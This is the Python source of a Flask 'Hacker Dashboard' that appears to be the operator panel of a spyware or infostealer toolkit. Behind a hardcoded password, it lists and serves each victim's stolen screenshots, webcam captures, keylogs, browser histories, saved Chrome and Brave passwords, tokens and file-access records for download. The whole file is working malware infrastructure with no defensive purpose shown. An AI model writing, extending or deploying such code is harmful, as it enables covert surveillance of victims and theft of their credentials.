# FILE: app.py
from flask import Flask, request, render_template_string, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)

PASSWORD = "disha456"
LOG_DIR = os.path.expanduser("~/logs")

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🕵 Hacker Dashboard</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        h1 { color: #0ff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #0f0; padding: 10px; text-align: left; font-size: 14px; }
        th { background-color: #222; font-size: 16px; font-weight: bold; }
        a { color: #0ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>📂 Logs in Server</h1>
    <form method="POST">
        {% if not authorized %}
        <input type="password" name="password" placeholder="Enter Password" style="padding:10px;" />
        <input type="submit" value="Login" style="padding:10px;" />
        {% endif %}
    </form>
    {% if authorized %}
    <table>
        <tr>
            <th>Time</th>
            <th>User / Host</th>
            <th>🖼 Screenshot</th>
            <th>📷 Webcam</th>
            <th>⌨ Keylogs</th>
            <th>🔓 Decrypted Keylogs</th>
            <th>🌐 Chrome History</th>
            <th>🦁 Brave History</th>
            <th>🔐 Chrome Passwords</th>
            <th>🔐 Brave Passwords</th>
            <th>🪙 Tokens</th>
            <th>📄 Recent Files</th>
            <th>📁 File Access</th>
        </tr>
        {% for row in logs %}
        <tr>
            <td>{{ row.timestamp }}</td>
            <td>{{ row.user }}</td>
            {% for col in row.files %}
            <td>
                {% if col %}<a href="/download/{{ col }}">{{ col }}</a>{% else %}—{% endif %}
            </td>
            {% endfor %}
        </tr>
        {% endfor %}
    </table>
    {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    authorized = False
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            authorized = True
    elif request.args.get("auth") == PASSWORD:
        authorized = True

    logs = []
    if authorized:
        # Scan log folders
        for folder in sorted(os.listdir(LOG_DIR), reverse=True):
            folder_path = os.path.join(LOG_DIR, folder)
            if not os.path.isdir(folder_path): continue
            files = os.listdir(folder_path)
            files_lower = [f.lower() for f in files]

            logs.append({
                "timestamp": folder.replace("_", " "),
                "user": folder.split("_")[0],
                "files": [
                    find_file(files, "screenshot"),
                    find_file(files, "webcam"),
                    find_file(files, "keylogs_export"),
                    find_file(files, "decrypted_keylogs"),
                    find_file(files, "chrome_history"),
                    find_file(files, "brave_history"),
                    find_file(files, "chrome_passwords"),
                    find_file(files, "brave_passwords"),
                    find_file(files, "token"),
                    find_file(files, "recent"),
                    find_file(files, "file_access"),
                ]
            })

    return render_template_string(TEMPLATE, authorized=authorized, logs=logs)

def find_file(files, keyword):
    for f in files:
        if keyword in f.lower():
            return f
    return None

@app.route("/download/<path:filename>")
def download(filename):
    # Scan folders for the file
    for folder in os.listdir(LOG_DIR):
        file_path = os.path.join(LOG_DIR, folder, filename)
        if os.path.exists(file_path):
            return send_from_directory(os.path.join(LOG_DIR, folder), filename, as_attachment=True)
    return "File not found", 404

if __name__ == "__main__":
    os.makedirs(LOG_DIR, exist_ok=True)
    app.run(host="0.0.0.0", port=10000)
